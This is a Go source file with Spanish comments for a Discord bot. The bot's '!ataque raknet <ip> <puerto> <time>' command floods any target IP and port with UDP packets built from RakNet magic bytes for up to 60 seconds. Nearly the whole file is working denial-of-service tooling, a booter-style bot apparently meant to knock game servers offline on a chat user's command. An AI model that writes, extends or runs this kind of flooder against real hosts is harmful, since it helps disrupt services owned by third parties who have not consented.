package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

const (
	RaknetMagic = "\x00\xFF\xFF\x00\xFE\xFE\xFE\xFE\xFE\x03\xFA\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\xFE\xFE\xFE\xFE\xFE\x03\xFA\x00\x00\x00\x00\x00\x00\x00\x00\x00"
)

var (
	Token string
)

func main() {
	// 1. Obtener el token del bot y guardarlo en token.txt.
	err := getToken()
	if err != nil {
		log.Fatalf("Error obteniendo el token: %v", err)
		return
	}

	// 2. Crear la sesión de Discord.
	dg, err := discordgo.New("Bot " + Token)
	if err != nil {
		log.Fatalf("Error creando la sesión de Discord: %v", err)
		return
	}

	// 3. Registrar el handler para los mensajes.
	dg.AddHandler(messageCreate)

	// 4. Abrir una conexión websocket con Discord.
	err = dg.Open()
	if err != nil {
		log.Fatalf("Error abriendo la conexión de Discord: %v", err)
		return
	}

	// Esperar una señal de interrupción (CTRL+C) para cerrar la conexión.
	fmt.Println("El bot está en ejecución. Presiona CTRL+C para detenerlo.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	// Cerrar la sesión de Discord.
	dg.Close()
}

func getToken() error {
	// Intentar leer el token desde token.txt
	token, err := readTokenFromFile("token.txt")
	if err == nil && token != "" {
		Token = token
		fmt.Println("Token leído desde token.txt")
		return nil
	}

	// Si no existe o está vacío, solicitarlo al usuario.
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Por favor, ingresa el token del bot de Discord: ")
	token, _ = reader.ReadString('\n')
	token = strings.TrimSpace(token)

	if token == "" {
		return fmt.Errorf("no se proporcionó un token")
	}

	// Guardar el token en token.txt
	err = saveTokenToFile("token.txt", token)
	if err != nil {
		log.Printf("Advertencia: No se pudo guardar el token en token.txt: %v", err)
	}

	Token = token
	return nil
}

func readTokenFromFile(filename string) (string, error) {
	file, err := os.ReadFile(filename)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(file)), nil
}

func saveTokenToFile(filename string, token string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(token)
	return err
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignorar los mensajes del propio bot.
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Dividir el mensaje en comandos y argumentos.
	parts := strings.Split(m.Content, " ")
	if len(parts) == 0 {
		return
	}

	// Manejar el comando !ataque raknet.
	if parts[0] == "!ataque" && parts[1] == "raknet" {
		if len(parts) != 5 {
			s.ChannelMessageSend(m.ChannelID, "Uso: !ataque raknet <ip> <puerto> <time>")
			return
		}

		ip := parts[2]
		port, err := strconv.Atoi(parts[3])
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "El puerto debe ser un número válido")
			return
		}
		duration, err := strconv.Atoi(parts[4])
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "El tiempo debe ser un número válido")
			return
		}

		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Atacando %s:%d durante %d segundos...", ip, port, duration))
		go raknetAttack(ip, port, duration, s, m.ChannelID) // ejecutar el ataque en una goroutine para no bloquear el bot
	}
}

func raknetAttack(ip string, port int, duration int, s *discordgo.Session, channelID string) {
	// Validar el tiempo.  Importante para evitar ataques demasiado largos.
	if duration > 60 { // Limitar a 60 segundos para seguridad.
		s.ChannelMessageSend(channelID, "El tiempo máximo de ataque es de 60 segundos.")
		return
	}

	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	for time.Now().Before(endTime) {
		conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
		if err != nil {
			log.Println("Error conectando:", err)
			s.ChannelMessageSend(channelID, fmt.Sprintf("Error al conectar: %v", err))  // reportar errores
			return // Detener el ataque si hay un error crítico
		}
		defer conn.Close()

		_, err = conn.Write([]byte(RaknetMagic))
		if err != nil {
			log.Println("Error enviando el paquete Raknet:", err)
			s.ChannelMessageSend(channelID, fmt.Sprintf("Error al enviar el paquete: %v", err)) // reportar errores
			return // Detener el ataque si hay un error crítico
		}

		// Pausa breve para evitar saturación del sistema.  Importante.
		time.Sleep(10 * time.Millisecond)
	}
	s.ChannelMessageSend(channelID, fmt.Sprintf("Ataque a %s:%d finalizado.", ip, port))
}
